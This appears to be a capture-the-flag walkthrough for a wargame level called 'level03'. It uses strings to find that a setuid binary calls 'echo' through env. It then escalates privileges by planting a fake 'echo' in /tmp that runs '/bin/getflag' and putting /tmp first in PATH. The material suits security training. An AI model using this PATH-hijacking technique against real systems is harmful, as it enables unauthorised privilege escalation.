ls -l level03 # We can see the file as flag03 auth

strings level03 # Get all Strings with 4+ char in the file

# We find to the code call 
  /usr/bin/env echo Exploit me
  
# In tmp we create a fake echo cmd that will call '/bin/getflag', give +x right, we change $path to call /tmp first, then call ./level03
echo '/bin/getflag' > /tmp/echo; chmod +x /tmp/echo; export PATH=/tmp:$PATH; ./level03
